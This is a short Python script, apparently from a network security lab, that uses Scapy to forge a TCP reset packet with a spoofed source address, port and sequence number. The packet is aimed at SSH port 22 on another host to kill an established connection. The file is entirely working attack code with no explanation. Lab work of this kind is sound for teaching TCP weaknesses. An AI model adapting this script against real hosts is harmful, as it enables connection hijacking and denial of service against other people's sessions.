#!usr/bin/python3
from scapy.all import *
import sys

source_port = 45304
sequence = 2158083047

print("Sending RESET Packet ...")
IPLayer = IP(src="10.0.2.10", dst="10.0.2.8")
TCPLayer = TCP(sport=source_port,dport=22,flags="R", seq=sequence)
pkt = IPLayer/TCPLayer
pkt.show()
send(pkt,verbose=0)
